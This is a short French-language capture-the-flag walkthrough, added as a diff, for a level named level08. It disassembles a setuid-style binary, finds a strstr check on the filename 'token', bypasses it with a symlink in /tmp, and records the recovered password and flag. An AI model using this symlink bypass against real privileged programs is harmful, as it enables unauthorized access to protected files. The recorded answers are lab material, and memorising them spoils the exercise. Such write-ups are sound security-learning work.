@@ -1,0 +1,37 @@
+>ls
+level08 token
+
+>./level08
+./level08 [file to read]
+
+>./level08 token
+You may not access 'token'
+(message  d'erreur different donc ca veut dire qu'il y a une verif par rapport au nom qql part)
+
+>gdb level08
+    >disas main
+    ...
+    0x080485af <+91>:	movl   $0x8048793,0x4(%esp)
+    0x080485b7 <+99>:	mov    %eax,(%esp)
+    0x080485ba <+102>:	call   0x8048400 <strstr@plt>
+    ...
+
+    on trouve ceci si on cherche
+    strstr compare qql chose avec token (premiere ligne)
+
+Comme on a vu que level08 a un fichier en argument [file to read], il faut reussir a creer une copie du fichier token pour le lire (sans que ce soit le meme nom)
+Et vu que l'on a pas les permissions pour cp, mv, on peut creer un lien qui redirige vers le fichier token
+
+>ln -s /home/user/level08/token /tmp/link
+>ls -l /tmp/link
+lrwxrwxrwx 1 level08 level08 5 Apr  7 10:44 /tmp/link -> token
+
+Donc maintenant on peut utiliser ./level08
+>./level08 /tmp/link
+quif5eloekouj29ke0vouxean
+
+>su flag08
+quif5eloekouj29ke0vouxean
+
+>getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
